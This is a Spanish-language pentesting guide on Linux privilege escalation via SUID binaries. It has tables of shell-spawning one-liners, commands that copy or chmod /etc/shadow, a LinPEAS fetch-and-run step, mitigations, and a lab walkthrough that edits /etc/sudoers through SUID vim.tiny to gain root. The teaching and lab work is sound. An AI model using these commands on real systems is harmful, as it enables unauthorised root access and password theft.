
# Binarios SUID

Los binarios con el bit **SUID** (Set User ID) activado representan una de las vías más clásicas y efectivas para escalar privilegios en sistemas Linux. Un atacante con acceso limitado puede explotar un binario SUID mal configurado para ejecutar comandos con los permisos del propietario del archivo (normalmente `root`), obteniendo así una shell con privilegios elevados.

***

## <mark style="color:purple;">¿Qué es el bit SUID?</mark>

En Linux, cada archivo tiene permisos de lectura (r), escritura (w) y ejecución (x) para el propietario, el grupo y otros. El bit SUID (Set User ID) se representa con una `s` en lugar de la `x` en los permisos del propietario:

```bash
-rwsr-xr-x  1 root root  12345  /usr/bin/passwd
```

Cuando un ejecutable tiene este bit activado, **se ejecuta con los permisos del propietario del archivo**, no del usuario que lo lanza. Si el propietario es `root`, el programa correrá como `root`, independientemente de quién lo ejecute.

Esto es útil para programas como `passwd` (que necesita modificar `/etc/shadow`) o `ping` (que necesita crear sockets raw). Sin embargo, si un binario peligroso (como `bash`, `find`, `vim`, etc.) tiene SUID y pertenece a `root`, cualquier usuario puede ejecutarlo y obtener una shell con privilegios de superusuario.

***

## <mark style="color:purple;">Identificar binarios SUID</mark>

### **Comandos básicos**

```bash
# Buscar todos los archivos con SUID en todo el sistema
find / -perm -4000 -type f 2>/dev/null

# Buscar SUID y SGID (Set Group ID) juntos
find / -perm -6000 -type f 2>/dev/null

# Mostrar detalles (permisos, propietario, tamaño)
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

#### **Explicación de parámetros:**

* `-perm -4000`: busca el bit SUID (valor octal 4000)
* `-type f`: solo archivos regulares (no directorios)
* `2>/dev/null`: redirige errores (permisos denegados) a la nada

#### **Alternativa más completa**

```bash
# Incluye también binarios en rutas comunes de forma más rápida
find /usr/bin /usr/sbin /bin /sbin /usr/local/bin -perm -4000 -type f 2>/dev/null
```

***

## <mark style="color:purple;">Binarios SUID peligrosos comunes</mark>

No todos los binarios con SUID son explotables. Los siguientes son especialmente peligrosos porque permiten ejecutar comandos arbitrarios o lanzar una shell:

<table data-header-hidden><thead><tr><th width="208.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Binario</td><td>Comando de explotación</td></tr><tr><td><code>find</code></td><td><code>find /tmp -exec /bin/sh \; -quit</code></td></tr><tr><td><code>bash</code></td><td><code>bash -p</code></td></tr><tr><td><code>sh</code></td><td><code>sh -p</code></td></tr><tr><td><code>dash</code></td><td><code>dash -p</code></td></tr><tr><td><code>vim</code> / <code>nvim</code></td><td><code>vim -c ':!/bin/sh'</code></td></tr><tr><td><code>nano</code></td><td><code>nano</code> → <code>Ctrl+R</code> → <code>Ctrl+X</code> → <code>reset; sh 1>&#x26;0 2>&#x26;0</code></td></tr><tr><td><code>cp</code></td><td><code>cp /etc/shadow /tmp/shadow</code> (luego crackear)</td></tr><tr><td><code>mv</code></td><td>mover archivos sensibles a ubicaciones accesibles</td></tr><tr><td><code>cat</code></td><td>leer archivos restringidos (ej: <code>/etc/shadow</code>)</td></tr><tr><td><code>less</code> / <code>more</code></td><td><code>less /etc/passwd</code> → <code>! /bin/sh</code></td></tr><tr><td><code>awk</code></td><td><code>awk 'BEGIN {system("/bin/sh")}'</code></td></tr><tr><td><code>python</code></td><td><code>python -c 'import os; os.setuid(0); os.system("/bin/sh")'</code></td></tr><tr><td><code>perl</code></td><td><code>perl -e 'setuid(0); exec("/bin/sh");'</code></td></tr><tr><td><code>php</code></td><td><code>php -r 'posix_setuid(0); system("/bin/sh");'</code></td></tr><tr><td><code>ruby</code></td><td><code>ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'</code></td></tr><tr><td><code>env</code></td><td><code>env /bin/sh -p</code></td></tr><tr><td><code>sudo</code> (si se puede ejecutar sin contraseña)</td><td><code>sudo -i</code></td></tr><tr><td><code>pkexec</code></td><td><code>pkexec /bin/sh</code> (si está en el entorno gráfico)</td></tr><tr><td><code>chmod</code></td><td><code>chmod 777 /etc/shadow</code> (si el binario es SUID root)</td></tr></tbody></table>

***

### Casos especiales: binarios menos conocidos

<table data-header-hidden><thead><tr><th width="132.6666259765625"></th><th></th></tr></thead><tbody><tr><td>Binario</td><td>Explotación</td></tr><tr><td><code>gdb</code></td><td><code>gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh")' -ex quit</code></td></tr><tr><td><code>strace</code></td><td><code>strace -o /dev/null /bin/sh</code> (no siempre funciona)</td></tr><tr><td><code>taskset</code></td><td><code>taskset 1 /bin/sh -p</code></td></tr><tr><td><code>ionice</code></td><td><code>ionice /bin/sh -p</code></td></tr><tr><td><code>nice</code></td><td><code>nice -n 20 /bin/sh -p</code></td></tr><tr><td><code>stdbuf</code></td><td><code>stdbuf -i 0 /bin/sh -p</code></td></tr><tr><td><code>nohup</code></td><td><code>nohup /bin/sh -p</code></td></tr><tr><td><code>setarch</code></td><td><code>setarch $(arch) /bin/sh -p</code></td></tr><tr><td><code>unshare</code></td><td><code>unshare -r /bin/sh</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Automatización de la búsqueda</mark>

#### **Usando LinPEAS (recomendado)**

LinPEAS detecta automáticamente binarios SUID y muestra los más peligrosos:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | grep -A 20 "SUID"
```

#### **Script manual personalizado**

```bash
#!/bin/bash
# Busca binarios SUID y verifica si son peligrosos

dangerous=("find" "bash" "sh" "dash" "vim" "nano" "cp" "mv" "cat" "less" "more" "awk" "python" "perl" "php" "ruby" "env" "chmod" "chown" "gdb" "strace" "taskset" "nice" "nohup" "setarch" "unshare")

find / -perm -4000 -type f 2>/dev/null | while read binary; do
    name=$(basename "$binary")
    if [[ " ${dangerous[@]} " =~ " ${name} " ]]; then
        echo "[!] Peligroso: $binary"
    else
        echo "[-] $binary"
    fi
done
```

***

## <mark style="color:purple;">Mitigaciones y buenas prácticas</mark>

Estas son algunas recomendaciones y buenas prácticas:

* **Auditar regularmente** los binarios con SUID: `find / -perm -4000 -type f 2>/dev/null`
* **Eliminar el bit SUID** de binarios que no lo necesiten: `chmod u-s /ruta/binario`
* **Evitar dar SUID a intérpretes** (bash, python, etc.) o a editores.
* **Usar capacidades Linux** en lugar de SUID cuando sea posible (`setcap`).
* **Monitorear** la creación de nuevos binarios SUID con herramientas como `auditd`.

***

## <mark style="color:purple;">Cheatsheet</mark>

<table data-header-hidden><thead><tr><th width="211.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Buscar todos los SUID</td><td><code>find / -perm -4000 -type f 2>/dev/null</code></td></tr><tr><td>Buscar SUID y SGID</td><td><code>find / -perm -6000 -type f 2>/dev/null</code></td></tr><tr><td>Explotar <code>find</code></td><td><code>find / -exec /bin/sh \; -quit</code></td></tr><tr><td>Explotar <code>bash -p</code></td><td><code>/bin/bash -p</code></td></tr><tr><td>Explotar <code>vim</code></td><td><code>vim -c ':!/bin/sh'</code></td></tr><tr><td>Explotar <code>python</code></td><td><code>python -c 'import os; os.setuid(0); os.system("/bin/sh")'</code></td></tr><tr><td>Explotar <code>awk</code></td><td><code>awk 'BEGIN {system("/bin/sh")}'</code></td></tr><tr><td>Explotar <code>cp</code></td><td><code>cp /etc/shadow /tmp/shadow</code></td></tr><tr><td>Eliminar SUID</td><td><code>chmod u-s /ruta/binario</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Exploiting Setuid Programs II**</mark>

Los programas setuid pueden ofrecer gran potencia y flexibilidad, pero si no se protegen adecuadamente, pueden provocar fácilmente una vulneración total del sistema.

La máquina objetivo es accesible en `http://target.ine.local:8000`

**¡Tu misión es obtener acceso de superusuario al sistema y recuperar la flag!**

Accedemos a

```bash
http://target.ine.local:8000/
```

Y vemos que estamos dentro del servidor como `student` sin permisos sudo y no tenemos su contraseña:

```bash
student@target:~$ whoami
student
student@target:~$ sudo -l
[sudo] password for student:
Sorry, try again.
```

### Buscar Binarios SUID

```bash
student@target:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/vim.tiny
/bin/mount
/bin/su
/bin/umount
```

Observamos uno especialmente interesante: `vim.tiny`

### Verificar permisos

Observamos que el owner es `root` y lo pueden ejecutar cualquier usuario del sistema:

```bash
student@target:~$ ls -la /usr/bin/vim.tiny
-rwsr-xr-x 1 root root 1108024 Apr 10  2018 /usr/bin/vim.tiny
```

### Editar archivo sudoers

Usaremos `vim.tiny` para editar el archivo `/etc/sudoers` para proporcionarnos privilegios. Añadiremos al final esta línea que nos permite ejecutar cualquier comando sin tener que introducir la contraseña:

```bash
student ALL=NOPASSWD:ALL
:wq!
```

Comprobamos que funciona con el comando:

```bash
student@target:~$ sudo -l

Matching Defaults entries for student on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on target:
    (root) NOPASSWD: ALL
```

### Cambiamos a root

```bash
student@target:~$ sudo /bin/bash
root@target:~# whoami
root
```

### Acceso a la flag

```bash
root@target:~# cd /root
root@target:/root# ls
flag
root@target:/root# cat flag
3e5b8997be1101e01c5c3ea7********
```
